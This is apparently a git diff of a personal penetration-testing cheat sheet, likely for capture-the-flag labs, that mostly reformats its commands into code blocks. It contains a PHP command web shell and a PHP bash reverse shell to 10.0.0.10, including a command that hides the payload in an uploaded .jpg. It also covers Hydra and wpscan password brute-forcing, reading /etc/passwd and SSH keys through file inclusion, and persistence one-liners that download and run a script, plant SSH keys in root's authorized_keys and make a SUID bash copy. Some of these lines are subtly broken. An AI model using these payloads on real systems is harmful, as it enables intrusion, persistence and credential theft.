@@ -1,5 +1,9 @@
 # Most Important
+
+https://book.hacktricks.xyz/welcome/readme
+
 Check hacktricks on any subject. It'll probably have something useful.
+
 Always try default credentials.
 
 # Reconnaissance
@@ -50,14 +54,15 @@ Can also just try uploading an image file that contains only the backdoor, and i
 
 # PHP Payloads for File Upload Vulnerability
 
-#Command Backdoor
+# Command Backdoor
 ```<?php echo passthru($_GET['cmd']); ?>```
 Use like website.com/index.php?pg=/uploads/image.lol?cmd=ls
 
 # Reverse Shell
 ```<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>```
 
-PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try ```touch backdoor.jpg && echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>"```
+PHP will only execute on a non-PHP file (ie .jpg) if the .jpg includes a PHP includes. We can try 
+```touch backdoor.jpg && echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>"```
 
 # Privledge Escalation
 
@@ -97,7 +102,7 @@ To crack a SSH key
 # Hydra
 ```hydra -L users.txt -u -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -s 2222 -V -t 64```
 
-#Abusing Certain Services Angle
+# Abusing Certain Services Angle
 
 # WordPress
 ```wpscan -U username --url http://website.com/wordpress -P /usr/share/wordlists/rockyou.txt```
@@ -105,11 +110,23 @@ To crack a SSH key
 If we can grab wordpress admin credentials, we can pretty easily get a shell.
 
 # PostGresSQL
-psql -h 10.10.10.10 -u <username> default credentials are postgres and postgres
-#Other/Interesting Angles
+```psql -h 10.10.10.10``` -u postgres default credentials are postgres and postgres
 
 # MySQL
-mysql -h 10.10.70.250 -u root -p
+```mysql -h 10.10.70.250 -u root -p```
+
+# FTP
+ftp 10.10.10.10 
+
+
+# NFS
+```sudo showmount -e 10.10.10.10```
+```mkdir mnt```
+```sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock```
+
+# Other/Interesting Angles
+
+
 
 # Abusing Weird Text
 If there's a weird page with only text, try nc into it, like nc 10.10.10.10 7878
@@ -117,14 +134,6 @@ If there's a weird page with only text, try nc into it, like nc 10.10.10.10 7878
 # Overriding Weird Port Numbers on Firefox
 need to go to about:config, and add the port you want to acess, so it can be overridden
 
-# FTP
-ftp 10.10.10.10 
-
-
-# NFS
-sudo showmount -e 10.10.10.10
-mkdir mnt
-sudo mount -t nfs 10.10.10.10:/ ./mnt -o nolock
 
 # Abusing LFI
 Grab /etc/passwd to enumerate users.
@@ -134,23 +143,23 @@ Then we can try grabbing ssh keys, in /home/<user>/.ssh/id.rsa
 # Getting Files to/from Server
 
 Use a web server!
-python -m http.server 8080
+```python -m http.server 8080```
 
 # Improving an improved shell
 
-python3 -c "import pty;pty.spawn('/bin/bash');"
+```python3 -c "import pty;pty.spawn('/bin/bash');"```
 
-bash -i
+```bash -i```
 
 # Useful One Liners, and General Persistence
 
 ```wget 10.10.10.10:8080/kingme.sh && chmod u+x kingme.sh && mkdir /etc/testingdirectory &&  ./kingme.sh - u jtrigg 10.10.10.10 /etc/testingdirectory```
 
-echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" > /tmp/backdoor.sh
+```echo "bash -i >& /dev/tcp/127.0.0.1/8080 0>&1" > /tmp/backdoor.sh```
 
-wget 10.10.10.10:8080/id.pub && cp id2.pub /root/.ssh/authorized_keys/ && rm id.pub
+```wget 10.10.10.10:8080/id.pub && cp id2.pub /root/.ssh/authorized_keys/ && rm id.pub```
 
-wget 10.10.10.10:8080/id.pub && cp id2.pub /home/<user>/.ssh/authorized_keys/ && id.pub
+```wget 10.10.10.10:8080/id.pub && cp id2.pub /home/<user>/.ssh/authorized_keys/ && id.pub```
 
 ```cp /bin/bash /tmp/magic && chmod +s /tmp/magic```
 
